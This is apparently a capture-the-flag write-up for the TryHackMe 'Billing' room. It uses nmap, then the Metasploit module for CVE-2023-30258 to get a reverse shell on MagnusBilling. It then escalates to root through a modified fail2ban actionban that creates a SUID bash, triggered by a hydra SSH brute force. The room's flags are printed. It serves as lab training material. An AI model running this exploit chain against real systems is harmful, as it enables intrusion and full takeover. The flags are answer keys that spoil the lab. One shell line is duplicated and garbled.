
# Billing
https://tryhackme.com/room/billing

## Questions

> What is user.txt?  

> What is root.txt?  

This room involves using Metasploit.  

## 1. Enumerate Ports

```bash
└─$ nmap -A -sC -Pn 10.201.121.205
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 13:01 PDT
Nmap scan report for 10.201.121.205
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 3c:17:9e:70:e0:9e:e1:e7:57:88:3f:57:61:25:9e:e0 (ECDSA)
|_  256 aa:d8:a4:7f:74:fc:46:40:c7:44:e7:cf:29:48:cd:5f (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
|_http-server-header: Apache/2.4.62 (Debian)
| http-title:             MagnusBilling        
|_Requested resource was http://10.201.121.205/mbilling/
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   163.17 ms 10.23.0.1
2   ... 3
4   232.41 ms 10.201.121.205

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.95 seconds
```

> http://MACHINE_IP:80 redirects to a login page at http://MACHINE_IP/mbilling

## 2. Metasploit

We will be following [CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258) to exploit a command injection vulnerability in 
MagnusBilling application versions 6.x and 7.x. We can use [Metasploit](https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/) 
for this.

> `RHOST`: the remote target host address  

> `LHOST`: the listen address. __Important__ This may need to be set to your `tun0` IP address or similar, if you are connecting
> to your target over a VPN  

```bash
└─$ msfconsole -q
msf6 > use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > show options

Module options (exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: so
                                         cks5, socks5h, sapni, http, socks4
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/us
                                         ing-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /mbilling        yes       The MagnusBilling endpoint URL
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the loca
                                       l machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


   When TARGET is 0:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   WEBSHELL                   no        The name of the webshell with extension. Webshell name will be randomly generated if
                                         left unset.


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOSTS MACHINE_IP
RHOSTS => MACHINE_IP
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST VPN_IP
LHOST => VPN_IP
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
```

## 3. Create a Shell

```bash
meterpreter > shell
Process 2578 created.
Channel 0 created.
id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
SHELL=/bin/bash script -q /dev/null
$ export TERM=xterm
```

## 4. Find the User Flag

```bash
$ find / -name user.txt -exec cat {} \; -quit 2>/dev/null
THM{4a6831d5f124b25eefb1e92e0f0da4ca}
```

## 5. Escalate Privileges

> [Creating](https://www.revshells.com/) and [upgrading](https://0xffsec.com/handbook/shells/full-tty/) a reverse shell can help here.  

We always start with `sudo -l` when we get access to a user account.

```bash
$ sudo -l
sudo -l
Matching Defaults entries for asterisk on ip-10-201-121-205:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-201-121-205:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

User `asterisk` can run `fail2ban-client` with sudo privileges.
We can [exploit](https://juggernaut-sec.com/fail2ban-lpe/) that.

```bash
$ ps -ef | grep -i fail2ban
ail2ban| grep -i fa
root         855       1  0 10:51 ?        00:00:05 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
asterisk    3693    2709  0 12:14 pts/1    00:00:00 grep -i fail2ban
```

`fail2ban-server` is owned by root. Let's check `/etc/fail2ban` for the configuration file.

```bash
$ ls -l /etc/fail2ban
total 84
drwxr-xr-x 2 root root 12288 May 28 12:59 action.d
-rw-r--r-- 1 root root  3017 Nov  9  2022 fail2ban.conf
drwxr-xr-x 2 root root  4096 Jul 11  2021 fail2ban.d
drwxr-xr-x 3 root root 12288 May 28 12:59 filter.d
-rw-r--r-- 1 root root 25607 Nov  9  2022 jail.conf
drwxr-xr-x 2 root root  4096 May 28 12:59 jail.d
-rw-r--r-- 1 root root  1647 Mar 27  2024 jail.local
-rw-r--r-- 1 root root   645 Nov 23  2020 paths-arch.conf
-rw-r--r-- 1 root root  2728 Nov  9  2022 paths-common.conf
-rw-r--r-- 1 root root   627 Nov  9  2022 paths-debian.conf
-rw-r--r-- 1 root root   738 Nov 23  2020 paths-opensuse.conf
```

The key thing to note is that we can read everything.
User `asterisk` can also run all sudo commands with `fail2ban-client` meaning that
we should have permission to redirect to new configuration files and restart the service.
If we can get a writable configuration file, we have a working exploit.

```bash
$ cd /etc/fail2ban
$ grep -R actionban
...
action.d/iptables.conf:actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
...
```

This is the configuration file we want, but first we need to recursively copy the fail2ban directory
somewhere that we can write to.

```bash
$ cp -r /etc/fail2ban /tmp/fail2ban
```

Modify this line of `/tmp/fail2ban/action.d/iptables.conf`. 

```bash
#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
actionban = cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash 
```

Then restart the service pointing to our modified configuration.

```bash
sudo fail2ban-client -c /tmp/fail2ban/ -v restart
```

On the attacker run `hydra` and stop it with `Ctrl-C` after a few seconds.

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.201.121.205
```

On the target machine we should now see `rootbash`.

```bash
/tmp$ ls -l
total 1240
drwxr-xr-x 6 asterisk asterisk    4096 Aug 14 12:59 fail2ban
-rwsr-xr-x 1 root     root     1265648 Aug 14 13:13 rootbash
```

```bash
$ /tmp/rootbash -p
$ python3 -c 'import os;import pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash");'etuid(0);os.setgid(0);pty.spawn("/bin/bash");'
$ id
uid=0(root) gid=0(root) groups=0(root),1001(asterisk)
```

## 5. Find the Root Flag

```bash
$ find / -name root.txt -exec cat {} \; -quit 2>/dev/null
THM{33ad5b530e71a172648f424ec23fae60}
```

## Sources

1. https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/
2. https://juggernaut-sec.com/fail2ban-lpe/
